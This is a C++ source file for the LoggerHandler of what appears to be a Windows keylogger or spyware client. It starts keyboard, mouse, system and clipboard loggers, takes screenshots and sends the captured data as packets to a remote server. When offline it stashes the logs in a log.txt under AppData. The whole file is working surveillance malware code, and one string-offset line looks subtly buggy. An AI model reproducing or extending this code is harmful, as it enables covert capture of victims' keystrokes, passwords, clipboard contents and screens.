#include <algorithm>
#include <iterator>
#include <fstream>
#include <sstream>
#include "LoggerHandler.hpp"
#include "SystemLogger.hpp"
#include "KeyboardLogger.hpp"
#include "MouseLogger.hpp"
#include "DataLogger.hpp"
#include "../../Server/Log.hpp"
#include "Packet.hpp"
#include "ImgLog.hpp"
#include <Shlobj.h>

LoggerHandler::LoggerHandler() : _active(false)
{
	_loggers.emplace_back(new SystemLogger(this));
	_loggers.emplace_back(new DataLogger);
	_loggers.emplace_back(new KeyboardLogger(this));
	_loggers.emplace_back(new MouseLogger(this));
}

LoggerHandler::~LoggerHandler()
{
}

void		LoggerHandler::startLog()
{
	if (_active == true)
		return;
	_active = true;
	for (auto & it : _loggers)
	{
		it->start();
	}
}

void		LoggerHandler::stopLog() 
{
	if (_active == false)
		return;
	_active = false;
	for (auto & it : _loggers)
	{
		it->stop();
	}
	PostQuitMessage(0);
}

void		LoggerHandler::writeStatus(bool status)
{
	std::string result;

	_connectStatus = status;
	if ((result = getStoredLog()) != "")
		sendPacket(result);
}

void		LoggerHandler::getLog()
{
	std::string					result;
	
	result = _loggers[0]->getLog();
	if (result == "" || _currentLog == "")
		return;
	result += _currentLog;
	if (_connectStatus)
		sendPacket(result);
	else
		storeLog(result);
	_currentLog = "";

}

std::string	LoggerHandler::getClipboard() const
{
	return (_loggers[1]->getLog());
}

void		LoggerHandler::getImg() const
{
	ImgLog	log;
	Packet	packet;
	std::string name = dynamic_cast<SystemLogger*>(_loggers[0].get())->getNameForScreenshot();

	log.setData(dynamic_cast<DataLogger*>(_loggers[1].get())->takeScreenShot(), name);
	packet.setPacketType(Packet::IMG);
	packet << log;
	if (_connectStatus)
		Notify(std::move(packet));
}

void		LoggerHandler::addLog(const std::string &log)
{
	_currentLog += log;
}

std::string LoggerHandler::getLogPath(const std::string &file)const
{
	std::string logPath;
	WCHAR path[256];
	if (SUCCEEDED(SHGetFolderPathW(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
		std::wstring pfiles(path);
		logPath = std::string(pfiles.begin(), pfiles.end()) + "\\AppData\\Roaming\\" + file;
		return logPath;
	}
	return file;
}

void		LoggerHandler::sendPacket(const std::string &data)const
{
	Log		log;
	Packet	packet;

	log.setData(data);
	packet.setPacketType(Packet::LOG);
	packet << log;
	Notify(std::move(packet));
}

void		LoggerHandler::storeLog(const std::string &log)const
{
	std::ofstream out(getLogPath("log.txt").c_str(), std::ios::out | std::ios::app);
	
	if (out.is_open())
		out << log;
	out.close();
}

std::string LoggerHandler::getStoredLog()const
{
	std::ifstream		in(getLogPath("log.txt").c_str());
	std::ostringstream	sout;
	std::string			result;
	size_t				pos = 0;
	long				offset;
	HANDLE				hFile;
	
	if (in.is_open())
	{
		std::copy(std::istreambuf_iterator<char>(in),
			std::istreambuf_iterator<char>(),
			std::ostreambuf_iterator<char>(sout));
		if (sout.str().size() < 10)
		{
			in.close();
			return result;
		}
		if ((pos = sout.str().rfind("processName:")) == std::string::npos)
			pos = 0;
		result = sout.str().substr(pos - 1);
		in.close();
		offset = result.size();
		if ((hFile = CreateFile(getLogPath("log.txt").c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL)) != INVALID_HANDLE_VALUE)
		{
			SetFilePointer(hFile, -offset, 0, FILE_END);
			SetEndOfFile(hFile);
		}
		CloseHandle(hFile);
		return result;
	}
	return result;
}
